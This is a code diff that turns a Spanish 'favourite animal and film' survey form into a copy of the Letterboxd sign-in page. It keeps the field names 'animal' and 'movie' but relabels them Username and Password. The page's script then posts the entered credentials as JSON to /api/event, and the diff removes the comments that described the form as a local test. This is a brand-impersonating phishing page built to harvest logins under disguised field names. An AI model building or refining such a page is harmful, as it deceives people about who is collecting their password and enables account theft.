@@ -199,47 +199,46 @@
       <section class="card" aria-labelledby="title">
         <div class="form-content">
           <div class="brand-mark" aria-label="Letterboxd" role="img"><i></i><i></i><i></i></div>
-          <h1 id="title">Animal + película</h1>
-          <p class="signup"><span>Comparte tus favoritos</span></p>
+          <h1 id="title">Sign in to Letterboxd</h1>
+          <p class="signup"><span>New to Letterboxd?</span><a href="#create-account">Create an account</a></p>
           <form id="login-form" action="#" method="post">
             <div class="field">
-              <label for="animal">Animal favorito</label>
-              <input id="animal" name="animal" type="text" maxlength="40" autocomplete="off" required>
+              <label for="animal">Username</label>
+              <input id="animal" name="animal" type="text" autocomplete="username">
             </div>
             <div class="field">
-              <label for="movie">Película favorita</label>
-              <input id="movie" name="movie" type="text" maxlength="80" autocomplete="off" required>
+              <label for="movie">Password</label>
+              <input id="movie" name="movie" type="password" autocomplete="current-password">
             </div>
-            <p id="form-status" role="status" aria-live="polite" style="margin:16px 0 0;color:#cfe0f1;font-size:13px;text-align:center"></p>
+            <div class="options">
+              <label class="remember"><input type="checkbox" name="remember"><span>Remember me</span></label>
+              <a href="#reset-password">Reset password</a>
+            </div>
           </form>
         </div>
-        <button class="submit" type="submit" form="login-form">ENVIAR</button>
+        <button class="submit" type="submit" form="login-form">SIGN IN</button>
       </section>
-      <footer><span>Registro de prueba</span><span>Datos locales</span></footer>
+      <footer><a href="#terms">Terms</a><a href="#privacy">Privacy Notice</a><a href="#contact">Contact</a></footer>
     </div>
   </main>
   <script>
-    // Solo se envían los dos campos solicitados.
     document.querySelector('#login-form').addEventListener('submit', async (event) => {
       event.preventDefault();
       const form = event.currentTarget;
-      const status = document.querySelector('#form-status');
       const payload = {
         animal: form.elements.animal.value.trim(),
         movie: form.elements.movie.value.trim()
       };
-      status.textContent = 'Registrando evento de prueba…';
       try {
         const response = await fetch('/api/event', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        if (!response.ok) throw new Error('No se pudo registrar');
-        status.textContent = 'Evento de prueba registrado.';
+        if (!response.ok) throw new Error(`El servidor respondió ${response.status}: ${await response.text()}`);
         form.reset();
-      } catch {
-        status.textContent = 'No se pudo conectar con el servidor local.';
+      } catch (error) {
+        console.error('No se pudo registrar el evento:', error);
       }
     });
   </script>
